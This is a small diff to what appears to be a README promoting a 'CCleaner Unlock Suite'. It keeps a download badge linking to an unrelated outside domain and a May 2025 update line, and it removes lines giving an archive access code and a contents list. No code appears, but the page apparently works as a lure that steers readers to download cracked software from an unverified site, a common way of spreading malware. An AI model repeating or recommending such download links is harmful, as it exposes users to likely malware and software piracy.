@@ -53,8 +53,7 @@ ccleaner module viewer, ccleaner config tool, registry cleanup panel, system hea
 
 [![Download Unlock Tool](https://img.shields.io/badge/Download-CCleaner--Unlock--Suite-blueviolet?style=for-the-badge&logo=windows)](https://glocktober.com)
 
-🗝 Access code: `cleaner2025_gui`  
-📦 Contents: UI shell, simulated logs, instructions, screenshots  
+
 📆 Updated: May 2025
 
 ---
